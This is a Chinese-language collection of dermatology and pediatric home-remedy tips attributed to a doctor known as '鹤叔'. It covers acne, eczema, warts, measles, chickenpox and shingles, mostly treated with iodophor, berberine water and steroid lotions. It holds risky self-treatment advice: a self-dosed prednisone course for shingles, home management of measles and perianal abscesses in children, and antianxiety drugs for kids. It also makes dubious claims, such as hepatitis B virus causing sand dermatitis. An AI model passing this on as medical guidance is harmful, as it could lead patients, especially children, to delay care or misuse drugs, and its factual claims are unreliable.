35. 碘伏注意事项：一是过敏性的疾病不能用碘伏；第二不能当面膜来敷；三是碘伏不能喝。\n\n 36. 假期出门必备：碘伏，受伤了预防感染，不受伤治疗皮肤的细菌病毒感染；黄连素，拉肚子内服，晒伤、烫伤、痱子泡水外用；再带上开塞露肠干内用，皮肤干外用。\n\n 37. 肛周脓肿：500毫升标准黄连素水加50毫升碘伏，一天湿敷3-5次，每次半小时，坚持两周，三分之二不需要手术。\n\n 38. 汗疱疹：是长在手指侧面手侧面或脚趾旁密集的小水泡，非常痒，破了之后爆点皮，这个病的发病原因各有说法，有说病毒感染、有说过敏、有说排汗不畅，不要问鹤叔怎么根治，但是发病之后可以用乐肤液原液一天抹三次，一般一天就可以变干。\n\n 39. 灰指甲（甲癣）：氯霉素眼药水和碘伏2：1混合一天抹五次，三分之一概率有效。\n     \n     * 甲癣分两种：浅表型和甲下型，浅表型长在甲板表面，最早小白点，后来浑浊，再后来变形；甲下型长在甲板和甲床之间，这种到医院刮掉表面的甲屑，里面未必有真菌，不但检测不出还难治疗，因为在甲下，药进不来。\n     * 治疗有三种方式。第一种：拔甲。拔掉了直接上药；第二种：用口服药。抗真菌药保证新长出来的指甲是干净的，把老的顶掉；第三种：氯霉素眼药水和碘伏2：1混合抹上去，它可以往里面渗透，如果甲板太厚，可以用指甲搓搓薄一点再上药，一天5次，可能一个月见效。这样可以避免拔甲的痛苦和吃药的损伤，最后一种方法用一两个月还不行，快点换一、二种方法。\n\n 40. 用碘伏会发生红肿过敏的原因：分析是剂型原因，安全起见用1%的医用碘伏。\n\n 41. 病例：母子两个，洗完澡小腿就痒，一抓起红疙瘩，一个多月没采取任何措施，痒了抓，从小腿到大腿到全身慢性湿疹，这是十几块钱就能预防的，小腿皮脂腺少，洗完澡后小腿最先开始干，出现微小裂口，这时候用润肤露就能解决预防。\n\n 42. 润肤霜：分两种，水包油，清爽，油包水，保湿性好。皮肤干用用油包水的，如凡士林。\n\n 43. 足底皲裂：不是湿疹、脚气，是刮死皮刮出来的，越刮越厚越裂，只要不烫、不刮、不磨，早晚抹尿素霜，一般一两个月痊愈。\n\n 44. 肚脐发炎：氯霉素眼药水滴上，一天滴5次，两天就好了。\n\n 45. 婴儿痤疮：随着孩子激素逐渐稳定可以自然消退，书上说不需要治疗，但看着难受，容易湿疹化，可以用氯霉素眼药水和碘伏2：1混合一天五次，不是满脸抹，两天能消掉。\n\n 46. 小孩脖子淹了和红屁股：标准黄连素水湿敷，一天5次，严重的加10毫升乐肤液，最多一周下去。\n\n 47. 幼儿急疹：高烧39、40度，但是孩子没有萎靡不振，烧三四天烧退出疹，先躯干，后四肢，淡红色斑片，这是标准的幼儿急疹三四天自己就能好，不要慌。（注：没有说不让吃退烧药）\n\n 48. 婴儿头上发了脂溢性皮炎之后，会产生一层黄色的油痂，有的宝妈问要不要把它洗掉？这种皮炎发作需要三个环节，第一，油脂过度分泌，第二，油引起了细菌的大量繁殖，第三，细菌和它的排泄物刺激皮肤引起皮炎，所以在一斤水里放上三种常用药，分别针对这三个环节；5片黄连素减少油脂的分泌；10毫升碘伏可以有效杀菌，再放5毫升乐肤液消掉皮炎。用这个混合液一天抹5次，有4-5天就会消掉了，洗痂会刺激它，会加重的。\n\n 49. 晚上剧咳：有些肺火盛的孩子各项检查指标都正常，就是入夜剧咳，偶尔咳出小硬快，这一般是痰液被烤干了，刺激气管造成的，吃“桃金娘油”或“桉柠蒎”或者雾化，给痰软化排出来自然就不咳了。\n\n 50. 孩子前胸后背毛囊炎就三招：一是外用碘伏，二是睡前吃扑尔敏止痒，三是烫洗枕巾、背套、床单每周一次。\n\n 51. 鸡皮肤怎么治：不可能根治，青春期特别重时尿素霜有缓解。\n\n 52. 用黄连素水敷屁股后冬天会干：要懂变通，及时抹润肤霜。\n\n 53. 神经性皮炎：一半以上的精神压力来自于家长的清华北大梦，用点多虑平抗焦虑再抹点皮炎平可能就下去了，但压力一来又犯了，家长佛系一些。\n\n 54. 小儿唇炎：冬天常见小儿口唇炎用开塞露和乐肤液1：1。成人也可以用。\n\n 55. 头皮屑：洗发水加碘伏。能不能去根？因为是外界的复杂环境导致，谈不上去根儿。碘伏毕竟是化工用品，建议跟纯中药的洁尔阴换着用。碘离子和洁尔阴有杀菌和收敛的双重作用，所以这个方法说得通。（留言回复中说：先挤洗发水，再加两毫升碘伏）\n     \n     * 用碘伏治头皮屑后头皮红肿：分析可能用的是3%高浓度的，浇的也多，建议浓度低点多洗几次不影响效果。\n\n 56. 青春痘相关\n     \n     * 青春痘和粉刺的关系：如果青春痘是王者荣耀的话，粉刺是青铜、丘疹是白银、脓疱是黄金、结节是铂金、囊肿是钻石、瘢痕是星耀，聚合性痤疮是王者。\n     * 青春痘什么时候用碘伏，什么时候用十滴水：红头脓头用碘伏，白头黑头十滴水。\n     * 青春痘的痘痕：分轻重两种，重型的比如囊肿型、脓肿型痤疮一定留疤，神仙来也没用所有治疗方法只能淡化，而普通型（轻型）呢有两到三个月这个痕迹就能消退掉，别去乱花钱。\n     * 十滴水用法：一天至少三次洗脸，用稍烫手的一盆热水加半支十滴水洗脸用，再用中性洗面奶揉搓至少1分钟，最后用干手巾擦干，抹婴儿润肤露，减少化妆，不用粉底。\n     * 前胸后背、下巴脖子上的痘：是最简单的毛囊内的细菌感染。抹碘伏，为了防止睡后痒的时候无意识的抓，引起细菌种植，可以吃一片扑尔敏止痒；床单被套枕巾开水烫洗，每周一次。\n     * 各区青春痘：额区、鼻区、口周区、颊区。发病机理不同。鼻区最简单：一般是螨虫引起的，硫软膏加碘伏，硫软膏在外面杀，碘伏追进去杀。第二好治的颊区，细菌感染导致，手摸，抓痒也会让细菌种植，用碘伏绝杀，烫洗床品防止种植。前胸后背等同于面颊部的发病原理。第三是口周的痤疮，一般跟肠道内毒素太高有关所以在用十滴水和碘伏的同时忌吃辣椒，注意不要便秘，每天至少排便一次。第四是额区的，是由于雄性激素水平升高导致的，青少年多运动把雄性激素消耗掉。\n\n 57. 十滴水相关\n     \n     * 十滴水去粉刺什么时候可以停：皮肤上的油是血糖转化过来的，十滴水给你去掉了粉剌，那头吃的甜食多了产生的油脂比去掉的还多，怎么能停呢。\n     * 十滴水洗脸的问题：有四分之一的人会出现闭口粉刺突然红了，原因是毛囊打开了，细菌开始生长，处理很简单，用碘伏杀菌，等粉刺全部排出自然就好了。\n     * 用十滴水注意：用十滴水洗完后不要用粉底，用润肤霜。表皮干燥会使角质层增厚会堵塞毛孔的。注意皮肤损伤不能用。\n     * 十滴水洗黑头病例：洗一次就没黑头了，鹤叔提醒，黑头很长和毛囊深度一样长，表面的洗掉了，里面还多呢！接着洗。排出过程中如果口小，粉刺硬就会顶牛变红疙瘩，抹碘伏一段时间就好了。\n\n 58. 顽固粉刺三大主要原因 用十滴水洗脸去粉刺效果不理想的三大原因：第一，没有忌口，爱吃辣，肠道不停产生毒素，刺激粉刺；第二，洗完脸之后脸不抹润肤，表皮增厚，产生粉刺；第三，爱发脾气雄激素刺激额部，产生粉刺。\n\n 59. 脚臭：用碘伏把表面的菌杀掉，用甲硝唑把厌氧菌杀掉，就不臭了。每天晚上在洗脚水里加上10毫升碘伏，把脚和袜子浸泡5分钟以上，把甲硝唑片磨成粉在鞋垫上洒一遍，三分之二概率有效。足光粉像是把整个城市道路和汽车全都毁了治理尾气（破坏汗腺），鹤叔的方法相当于单双号限行（杀菌）。\n\n 60. 点评碘伏杀不死螨虫的视频：很正常，螨虫分40多种，人体就10多种有一碰碘伏就死的蠕形螨，有毒药杀不死的疥螨。就像猫科的猫和老虎，差距很大。\n\n 61. 冻疮：当归四逆汤（药房可配）起到一个活血温阳益气作用，加西药赛庚啶，可缩短病程，比激素还好用。\n\n 62. 脚汗：这是一个排水系统，不能把它堵上，这和交感神经兴奋有关，别为小毛病把整个神经系统给扰乱了。\n\n 63. 小孩肛周毛病：在家常备标准黄连素水，痱子的话一天抹5次3-4天下去，如果是肠液引起的肛周湿疹，标准黄连素水加10毫升乐肤液，两三天下去，肛周毛囊炎，在标准黄连素水中加20毫升碘伏，不用去医院。\n\n 64. 表皮受损的表现：摸着热、粗糙，红血丝。\n\n 65. 草莓鼻：热水加十滴水洗、泡、搓掉。\n\n 66. 表皮损伤不能用的：十滴水、碘伏，用了会疼，还有激素药膏和抹酸都不能用。\n\n 67. 红血丝、表皮损伤：标准黄连素水一天三次湿敷，不化妆，只用婴儿润肤霜。只是难在三个月不化妆。有的超级敏感肌，用黄连素水会红肿，那是由于表皮受损过于严重，对黄连素水不耐受，可以先用清水湿敷1-2周再用黄连素水。三个月后消红消肿了，就不用湿敷了，只需要每天保持三次用婴儿润肤露抹脸，再保持三个月。修复大红脸没有捷径，有人问已经见效了能不能化妆，鹤叔答，你想多了，两个阶段一个阶段三个月，皮肤结构决定了，少一个月都不行，\n\n 68. 缩小毛孔：用十滴水把毛孔里面的东西排出来，慢慢它就闭上了。\n\n 69. 前胸后背毛囊炎：在用碘伏杀菌的同时，每周把床单、枕巾、被套、内衣用开水烫洗一次。防止这些东西往你身上种植细菌。\n\n 70. 股癣：大腿根黄豆大小的小疙瘩，后来变成一串，一般是股癣，是脚气传染的。脚气药膏和皮炎平1：1混合治疗效果更好。\n\n 71. 过年小小孩易得的问题：感冒，穿衣服不及时；痱子，脱衣服不及时。用标准黄连素水，一天5次，在家就治好了。\n\n 72. 风寒性感冒：主要症状是怕冷、怕风，“一清二白”。“一清“是流清鼻涕；“二白”是白痰、白舌苔。治疗方法：姜糖水、葱白水都管用，多数不用往医院跑，更多方法可百度。\n\n 73. 皮肤的浅层细菌感染：包括毛囊炎、疖肿、蜂窝组织炎、青春痘，只要没有过敏，用碘伏既经济又实惠，感染比较深、有发烧必须去医院。\n\n 74. 口罩病：戴口罩久了一是内表面刺激引起的接触性皮炎？二是不透气导致的和痱子类似的损害。两种病早期都可以标准黄连素水湿敷来治疗。\n\n 75. 脸上表皮损伤怕刺激，可不可以不洗脸：不洗脸油脂会被细菌分解，变成乳酸刺激你的皮肤，表皮损伤没治好，脂溢性皮炎又来了。\n\n 76. 一线医护人员长时间戴手套，在乳胶滑石粉和高温联合作用下，特别容易出皮炎：如果用激素药膏，又高温又潮湿又容易继发细菌感染，这时可以用标准黄连素水，轻的抹，重的敷，简单、安全、有效。\n\n 77. 颈椎问题：颈椎1、2椎间隙受到压迫表现为头疼、头晕、失眠，眼睛不舒服；3、4椎间隙受到压迫表现为胸闷、脖子疼、枕部麻木、鼻子堵、还有咽喉里的异物感；颈椎的下段5、6或6、7椎间隙受损表现为：心慌、心律不齐、肩疼、胳膊疼、手指头麻。适当把手机放一放，活动活动，和家人聊聊天、走一走，症状就消失了。\n\n 78. 紫外线灯烧伤：先冰敷降湿，再抹上京万红。（来自鹤叔在抖音的留言回复）\n\n 79. 勤洗手的三个常见病：新冠防疫期间频繁洗手，会出现三个病。第一，手背皲裂，要每次洗手后抹护手霜；第二，指甲后连长倒刺，这叫逆剥，只能剪，不能撕；第三，手指侧面密密麻麻很痒的小水泡，是汗疱疹的话，抹乐肤液（哈西奈德溶液）\n\n 80. 在护目镜上擦碘伏，烧伤皮肤的原因和解决办法：当带上护具的时候，护具里面的皮肤表面有一个最大的变化，就是水气出不去，非常潮湿，我们表皮上最上层的角质层在这么潮湿的环境下会变厚变脆，摩擦之下会出现很多微小的裂口，碘伏也好，含氯消毒液也好，酒精也好，这些化学成份，顺着这个小裂口就长驱直入，深入表皮，甚至深入真皮，产生一系列的损害，这就跟表皮损伤，激素脸的姑娘们一样，连普通的洗面奶都用不了。赶快用标准黄连素水湿敷修复角质层。\n\n 81. 戴口罩、讲卫生的好处：出门戴口罩，回来就洗手、洗脸、洗鼻子，可以预防花粉、柳絮引起的过敏性鼻炎、哮喘、皮炎，比吃药效果还好。\n\n 82. 嘴角撕皮，为什么不建议撕皮？该如何治疗？如果你有这个毛病，你不戒它，光靠鹤叔说的抹1：1混合液是不够的。因为表皮越撕，越会拼命生长，最后嘴唇又红又肿，还爆皮。在管住手不撕皮的情况下，抹开塞露和乐肤液1：1混合液抹上。过两周恢复之后就别抹这个混合液，改用润唇膏。\n\n 83. 用含氯消毒液可以洗手吗？什么患者都不用含氯消毒液洗手，只有像操作过病人之后的医护人员，特殊情况才需要用含氯消毒液洗手，否则一般情况下不使用。用正常的洗手液、香皂、肥皂就可以，再不放心洗完后用酒精擦一遍就可以。比用什么东西洗手更重要的是怎么洗手。用六步洗手法，手背、手指缝、手指、手指尖、手腕都洗。相反，你用含氯洗手液特别容易过敏和烧伤皮肤。日常物品消毒用1000毫升水里放10毫升84消毒液就可以了。\n\n 84. 小儿痱子的原理和成因及解决办法：汗液可以滋润皮肤，同时还散热，你把宝宝给裹那么热，生怕宝宝冻着、捂着，宝宝出汗多，汗液出来后在表皮泡着，表皮会变厚，把汗腺口给堵上了。（待续）\n\n\n# 第二篇 直播科普汇总\n\n\n# 细菌类\n\n# 一、毛囊炎、肛周脓肿、肉芽肿\n\n中医讲体内湿气重易出现感染，表现为头上的毛囊炎，身上的疥肿、小孩的肛周脓肿，脸上的痤疮（痤疮也是毛囊炎），原因是体内的能量得不到宣泄，本质是皮肤内的感染。如果继续向下穿到真皮层、皮下组织，就形成脓肿。头皮毛囊变脓肿，头发就保不住了，并且不可再生；痤疮变脓肿就一定会留疤，所以感染类的疾病不要让他发展到重的程度。\n\n无论是头上、前胸后背、身上的、脸上的、小孩屁股上的，所有红的疙瘩，上面带白尖的，抹碘伏，一天三次，抹上就好，因为碘伏含碘剂，所有细菌都受不了，它直接破坏细菌的细胞壁。如果不管用，一定是碘伏有问题，要么是假的，要么是浓度不对，太低了，因为临床上没有一个浅表的细菌感染用碘伏无效的。\n\n肛周脓肿，有两大原因，一是毛囊炎发展而来，二是肛裂继发感染。两种原因抹碘伏同样有效。早期没有及时治疗，后来炎症突破表皮、真皮、皮下组织就形成了脓肿。治疗方法：肛周脓肿抹药膏其实效果不好，孩子屁股一夹起来就被挤跑了，推荐轻症的或小小孩用标准黄连素水+20毫升碘伏+10毫升乐肤液湿敷，在睡觉时，将浸湿到可以滴水但水不连成线的纱布夹在孩子的屁屁里，让纱布能接触到脓肿的位\n\n置，让纱布带走热量和水份，同时把炎症带走，起到收敛的作用，过几天会发现脓肿破了，脓被纱布带走，这就是所谓的拔毒，这时湿敷保持一天3-4次；4-6岁的孩子或严重的，直接用50毫升碘伏+5毫升乐肤液来敷，每次 10分钟-15分钟，2-3天，最多不超过5天，脓头会破开，纱布会把脓吸出来，只要把脓吸出来就好了，有一半孩子治的晚的，会出现囊壁，过段时间还会复发，只能先对抗着，一有反应就用碘伏，有的就封口了，形成一个硬疙瘩，这就没问题了；有的怎么也不封口的，孩子大点后可以去普外做个小手术，但绝大多数到不了那一步，需要手术的不超过1%。\n\n脓肿是囊肿向下发展而成，如果向上发展就会形成肉芽肿，治疗方法和脓肿一样。\n\n毛囊炎\n\n脓肿、肉芽肿\n\n形成囊壁反反复复的\n\n抹碘伏\n\n按轻重和孩子大小选择配比，纱布湿敷。\n\n湿敷对抗，能封口就好了，不封口的再手术\n\n# 二、干性湿疹\n\n典型的表现是，一脱衣服开始痒，过几个小时就不痒了，那是因为表皮干燥撑出小裂口，细菌入侵，产生组胺导致痒，同时细胞渗液，过几个小时，渗出液修复小裂口，阻止细菌的入侵，就不痒了。治疗方法就是像抹果酱一样用勺子抹凡士林，早晚各一次。\n\n角质层的保水率是99.9%，使下层的水出不来，同时外\n\n面的水也很难补进去，所以平时用的润肤水基本没什么用，只能起到软化角质的作用，角质层怕干，小腿前面和小臂都是最容易缺油的位置，易干燥，不注意润肤就会出现身体干的地方更干，油的地方更油。\n\n很多孩子的毛囊炎也是干性湿疹发展来的。\n\n# 三、成人脂溢性皮炎\n\n50毫升碘伏+5毫升乐肤液混合后涂抹，一天3次，4-5天，有效率80%。\n\n# 四、黄水疮\n\n是由葡萄球菌引起的，会结出黄色的痂。治疗方法是剃光头抹碘伏，一周时间就好，一样要烫洗衣被，每周一次。\n\n\n# 病毒类\n\n# 一、幼儿急疹\n\n两岁以内多发，前期症状是高烧，烧到39-40度，三天后烧降下来，头、脖子、身上、躯干起疹子，疹子3、4天就下去了，这种病其实只是看似凶险，家长不用慌乱，但如果病毒侵犯入脑了或出现了感染的话要快去医院。\n\n如何判断是否有侵犯入脑或感染：观察孩子吃完退烧药烧退了之后精神状态良好，跟没事儿人一样，那一般就没什么问题。如果孩子烧降不下来，或降下来之后精神萎靡，就需要快去医院。\n\n# 二、麻疹\n\n五岁以上多发，开春易得，前期症状是中高热38、39度，烧3、4天，烧退之后出疹，从头上发际开始长，一片一片的，嘴里有发蓝灰色的小泡。孩子只要精神头儿好就没事，不用去医院，如果没有特别重的症状，顶多吃点抗病毒药板兰根，大点的孩子吃大半包，小点的孩子吃小半包，一天三次，板兰根是确定有病毒抑制作用的中药，利巴韦林、阿西洛韦等这类药意义不大，只能起到干扰病毒繁殖的作用，无法完全杀死病毒。麻疹属于自限性疾病，两到三周就好了。\n\n# 三、风疹\n\n又称德国麻疹，它的症状与麻疹很像，比麻疹轻一点点，先是中低热，疹子起的也比麻疹轻一点、小一点，疹子退的也比麻疹快一些。\n\n# 四、水痘\n\n和手足口病很像，但这两种病不是一族的，水痘是由水痘带状疱疹病毒引起的，两种痘的形态很像，手足口的泡长在手心、脚心、嘴里，水痘主要在脸上。症状是先有发烧等和感冒相似的症状，但症状轻，几天后出疹，也不建议服用利巴韦林、阿西洛韦等抗病毒药，喝点板兰根就行，一定要吃抗组胺药止痒，一天3次，药量掌握在压住不痒就可以，水痘在鼓硬泡的时候最痒，一旦挠破了就会留疤，吃药止痒孩子就不会挠，抹上龙胆紫或碘伏，让它收敛变干、4、5天就干掉，再过4、5天就会脱落。\n\n如果孩子烧退了还是没精神有可能病毒入脑，一定要去医院。\n\n成人和小孩的治疗方法一样。\n\n# 五、带状疱疹\n\n发病多见于成人，小时候得过水痘的很少会得带状疱疹，水痘和带状疱疹都是由水痘带状疱疹病毒引起的，刚开始这种病毒潜伏在脊柱里，人在劳累、着急时易发病，病毒顺着神经跑出来，一般只长在身体的一边，成簇状分布在前胸后背，20岁左右的得了问题不大，四十岁以上的要注意，特别是60岁以上的，会非常痛苦。因为这种病毒不但侵犯神经，还破坏神经鞘，神经鞘一旦被破坏，恢复的时候就会箍紧神经，二周多后造成愈后神经痛。\n\n预防愈后神经痛的方法是从水泡出来算起，7天内开始服用强的松片（无高血压、糖尿病的情况下），每天早上吃一次，一次15毫克（3片），连吃7天后停掉，愈后一点问题都没有。发病期间可以吃止疼药，外用炉干石，龙胆紫，黄连素水都可以，但那都是次要的，它也属于自限性疾病，过段时间就会好。\n\n病人有糖尿病、高血压的建议在医生指导下用药，其实强的松对糖尿病、高血压病人的影响是有限的。\n\n# 六、传染性软疣\n\n不分季节发病，治疗不彻底的例子很多，它是由痘病毒引起的，这种病毒在自然界中很少见。但它具有传染性，必须要夹掉。它和水痘的区别是水痘是亮的，它是白了，如芝麻、针尖大小，表面发平，中间有个脐窝，后背、四肢上端多发，符合以上特征基本可以确诊。\n\n治疗方法是1、用镊子夹掉，或先用针挑破再用摄子把白心挤掉，最后用碘伏擦。只要发现就要及时全部清掉，千万别耽误。第一次清完，后面两周可能还会出，因为还有藏在下面没有发出来的，只要出来就继续去处理掉，一般三周下来，就不会再出了；2、防止病毒种植回来。每周要烫洗被褥和内衣、毛巾等，全家的都要烫洗。烫洗的方法是每周一次将衣物、床品放在一个大盆里，用开水浇进去，放凉了之后再放洗衣机洗。用84、酒精都不行。\n\n不用担心留疤问题，因为没有侵犯到真皮层；碘伏也不会留下色素沉着，有时可能会有表皮的着色，过一段就消失了。\n\n# 七、沙土性皮炎\n\n孩子玩沙土或在垫子上爬完之后，多发于手脖、脚脖上和皮肤颜色差不多的散在的一个个微微隆起，这是由乙肝病毒引起的。治疗方法是吃板兰根，局部不需要过多处理，可以抹碘伏，2-3周就好了。\n\n# 八、扁平疣\n\n如芝麻、针尖大小，一般不超过绿豆大，表面平平的，发乌发暗，扁平疣是由hpv3、8、10型引起的，皮肤上的病毒免疫细胞是杀不了的，但它是暴露在皮肤上面，所以用碘\n\n伏，小孩用碘伏有效率在一半以上，因为小孩角质层只有7-8层，比较薄，碘伏渗进去直接就把病毒杀死了，成人的角质有15层左右，需要把表皮打薄，可以用乌鱼骨磨薄，每天抹3-5次碘伏，成人有效率在三分之一，当快好的时候会有点痒，80%-90%，快好时有红肿，接着抹就可以，但是注意眼周的别用，因为眼周的皮肤比较娇嫩，容易引起刺激反应。\n\n上面方法无效的或眼周的只能用激光去做掉，还有一些抹五氟尿嘧啶或鸭胆子，但是它们是强腐蚀性，易形成坑。\n\n# 九、寻常疣（刺猴）\n\n用碘伏的有效率不到10%，因为它太厚了，碘伏渗不进去，建议用激光打掉，但两个地方的不建议用激光，一个是指甲旁边的（甲旁疣）和脚底的（跖疣），甲旁疣用激光会影响指甲，跖疣用激光会影响走路且易感染。建议用鸡眼膏，在鸡眼膏中间的红色水杨酸上放一粒高锰酸钾，24小时换一次，一天下来，就会变黑，只用两天，基本就够了，时间长了会腐蚀皮肤成坑，千万别贪快，皮肤嫩的用一天就停，如果不彻底，过几天再用一个阶段，一定掌握分寸。\n\n# 十、单纯性疱疹\n\n俗称火燎泡，是由病毒引起，在脑子里的神经结潜伏，感冒发烧后易发病，因为免疫细胞进不了神经结，不能根治，呈黄白色，形成的痂是棕色的。治疗方法及注意事项：一是不要继发细菌感染，用红霉素、金霉素软膏涂沫；二是别亲孩子，会传染；三是小孩得了可能会入脑，表现为头疼，没精神，要及时去医院。\n\n\n# 真菌类\n\n# 一、头癣\n\n表现为掉头发，有的贴着根断，头皮能看到头发根的黑点，有的会留一点头发茬，这两种情况都是头癣。治疗方法：不需要“坐等还书”，因为头皮角质层长的特别快，一般的“坐等还书”进不来，效果差；用碘伏抹比什么都好使，而碘伏顺着角质层向下渗，杀死真菌，真菌的孢子虽然带硬壳，碘伏对它也有效，只是需要时间长一点。\n\n注意头癣与斑秃的区别，斑秃的头皮是光的，看不到头发茬，小孩得了斑秃不用管，那是毛囊休眠了，三个月就长出来了。\n\n有些人触类旁通，用碘伏治猫癣、狗癣，因为同样是真菌类的病，所以也一样有效。\n\n# 二、脚气是否可以有碘伏\n\n碘伏可以杀死细菌、病毒、真菌，那么脚气可以用碘伏吗？不是完全不可以，只是有一点要注意：长时间用，怕皮肤受不了，产生刺激损伤，头上能用是因为头上的角质层厚。鹤叔推荐的原则首先是安全，其次是有效。\n\n# 三、汗斑、花斑癣、股癣、体癣\n\n汗斑、花斑癣多见于前胸后背，有的发红、紫，有的发黄、灰色，有点白沫沫，呈一粒粒的，像金钱豹的花纹；体\n\n癣呈地图样，中心的颜色和正常肤色一样；股癣是脚上真菌穿裤子时，脚蹬到裆部再种植到大腿根儿造成的；治疗方法都用“坐等还书”，用碘伏不是不可以，但是怕刺激皮肤，注意股癣不要用碘伏，因为裆部容易磨擦会使皮肤损伤。除了用药以外，还需要烫洗可能接触真菌部位的衣服和床品，每周一次。\n\n\n# 损伤类\n\n# 一、激素脸敷脸过程中出现的问题\n\n1、敷过十几天后是不是可以开始化妆？不可以，因为这时皮肤基底层并没有真正恢复，少于三个月，根本修复不了，这是皮肤结构决定的。三个月后即使修复，其稳定性也很差，因为免疫系统还记得这个事，因此易复发。所以先黄连素水湿敷三个月，之后不用湿敷了，但是要记得抹婴儿润肤霜，再过三个月。以上两个阶段，都不能化妆。\n\n2、敷十几二十天后出现反跳。表现为干、抹润肤霜后出现刺痛。原因分析：以前肌底层有炎症，负责防守的细胞在肌底层聚集，黄连素杀菌、收敛，毛细血管收缩，上面的表皮开始生长，防守的细胞撤退，出现空窗期。这时表面有刺激就出现下面的反应，出现疼痛，毛细血管又扩张，出现了红血丝，本来抹润肤霜不疼的，现在又疼了，这属于正常现象。解决方法是将黄连素水的浓度降低（如5片改为1片），如果不疼了就用稀释的，如果还是疼，就用清水（或纯净水），这样减少刺激1-2周后换回到标准的黄连素水，就不疼了，因为这时皮肤已经彻底变厚了。\n\n3、儿童的红血丝不需要处理，因为儿童的角质本来就特别薄，所以能看见里面的毛细血管很正常，并且胎儿时期，为保证今后发育会储备和囤积很多的毛细血管。\n\n# 二、唇炎\n\n成人的唇炎多为手撕皮造成的，不要撕，抹开塞露和乐肤液1：1混合液。\n\n儿童唇炎造成的原因是擦嘴方法不正确。如用袖子会摩擦表皮；用湿纸巾会带走油脂，使角质受损更快更刺激；用软的纸擦也不行，因为小孩吃的菜汤沾在皮肤上，把皮肤泡脆了，纸擦后出现微小裂口，盐份会刺激。应该先用清水洗，再用干毛巾沾干，最后抹上开塞露和乐肤液1：1的混合液抹在唇炎处，如果感觉抹上疼，就只抹开塞露，开塞露里面的硫酸镁是苦的，防止孩子舔，甘油成分也能帮助唇炎恢复，两周左右就好了。\n\n日光性唇炎多发于下嘴唇，是由日光照射引起的，可使用上面同样的方法治疗。\n\n乐肤液是激素类的药物，只可短期使用，好了之后就不用抹混合液了，日常抹凡士林保护皮肤。\n\n# 三、肛周湿疹\n\n肛周和口周的结构一样，皮肤和粘膜的过度区称为栉膜，很薄，所以肛周湿疹和唇炎是一样的治疗方法，用开塞露和乐肤液1：1混合抹，嫌油的可以换成艾洛松和凡士林1：1。\n\n有人疑问激素类药膏能长期使用吗？完全不用担心，两周就好了，根本不需要长期用，碘伏也是同样道理，人的皮肤展开有两平米，不是全身刷，哪需要抹哪，不存在长期使用。\n\n注意：1、很多病与卫生习惯有关，平时要给孩子一天两次清洗会阴和肛周等私处，防止出现湿疹和脓肿；2、避免吃辣的，因为会刺激肠道，加强肠蠕动，分泌肠液刺激肛周，易引发湿疹。\n\n# 四、倒刺\n\n又称逆剥，疫情期间总洗手会导致起手背糙、倒刺，倒刺不要撕，要将其剪掉，每次洗完手抹上护手霜，如果用凡士林代替护手霜更好。\n\n# 五、手脚干裂\n\n手脚干裂是平时烫、磨、刮，刺激皮肤，造成表皮增厚皲裂，要避免这些行为，抹尿素霜软化，之后厚皮会一点点脱落，一两个月之后就光滑了。注意爆皮后让他自然脱落，不要人为撕剪。\n\n# 六、人工性皮炎（角化性湿疹、肥厚性湿疹）\n\n皮肤痒就要吃药止痒，同时管住手，死皮不要撕、剪，\n\n治疗过程中会有死皮翘起来，也不要动它，一点点自己掉了就好了。这些人为撕皮造成的皮炎属于人工性皮炎，道理和手脚干裂一样，治疗方法也一样。\n\n# 七、肛裂\n\n有的是表皮的裂，有的到了真皮、皮下，分不清是哪种的，都用碘伏，只要不感染就能长好。\n\n\n# 毛孔、汗腺\n\n# 一、汗疱疹\n\n一般长在手指侧面，呈小水泡状。多见的发病人群：1、护士；2、出汗多的人；3、游泳的人；4、饭店洗盘子的人。原因是经常洗手把表皮角质层洗塌了或被汗、水泡塌了，汗出不来，皮脂腺顶出了小包，水份被吸收了，盐份在那刺激，就会痒。如果治疗方法不对，别挤别撕，会损伤真皮层成湿疹，红、肿、痒。鹤叔推荐：用乐肤液（哈西奈德溶液）涂抹，切记不要买成乐肤杀菌液。\n\n# 二、毛周角化症\n\n把表面的硬尖抠掉，里面盘着一根小毛发。抹尿素霜可以抑制角化，可明显减轻，但这种病是基因病，去不了根儿，如果红肿，可以用艾洛松和尿素霜1：1混合涂沫。\n\n# 三、痤疮\n\n分为鼻区、口周区、额区、面颊区。各区发病机理不同。\n\n鼻区最简单：一般是蠕形螨引起的，先抹碘伏、干了之后抹硫磺软膏，碘伏杀里面的，它跑出来之后，硫磺软膏在外面杀，一天2-3次，很容易治好，已经变成酒糟鼻的斑痕是恢复不了的。\n\n第二好治的是颊区，细菌感染导致，前胸后背等同于面颊部的发病原理。手摸，抓痒也会让细菌种植。可用碘伏杀菌，晚上睡前吃一次抗组胺药，如半片扑尔敏或开瑞坦，烫洗床品防止种植。\n\n第三是口周的痤疮，一般跟肠道内毒素太高有关，所以忌吃辣椒，调整肠胃，每天至少排便一次。\n\n第四是额区的，是由于雄性激素水平升高导致的，雄性激素会使表皮增厚，堵塞毛囊，青少年多运动把雄性激素消耗掉，成年人要把生活、工作问题解决好，不推荐自己服抗雄激素的药，因为自己掌握不好量，乱用会伤身体。\n\n除了以上的注意事项和解决方法外，四区都可遵循白头、黑头用十滴水洗，红头、脓头用碘伏抹的原则治疗。\n\n十滴水洗脸方法：一盆温热水加半支约2.5毫升的十滴水洗脸，之后用中性洗面奶搓一分钟，不喜欢味道的可以最后用温热的清水冲洗，毛巾擦干，洗完脸会干，一定要抹润肤露。十滴水有清热开窍的功效，可帮助打开毛囊口，虽然里面含有辣椒和酒精，但是已经被我们稀释了一千倍，不会刺激。\n\n# 四、痱子\n\n痱子根据轻重程度分为白痱、红痱、深痱、脓痱。出的汗（盐水）往上冒形马白点，叫白痱；多一些汗出不来横向两边撑开毛囊，形成红头，叫红痱；再重一点向下漫延有脓叫脓痱；再继续向下发展成深痱。治疗方法是白痱用标准黄连素水，一天5次抹或湿敷15-20分钟，一天3次，也可以用十滴水半支放在一大盆湿热水中给孩子洗澡，2-3天消褪；红痱用标准黄连素水+5毫升乐肤液，一天3次湿敷，2-3天消褪；脓痱标准黄连素水加5毫升碘伏（严重的10毫升）和5毫升乐肤液，一天3次温敷，4-5天消褪；深痱用脓痱的方法也可以治，碘伏、乐肤液比例可酌情增加。\n\n\n# 其他\n\n# 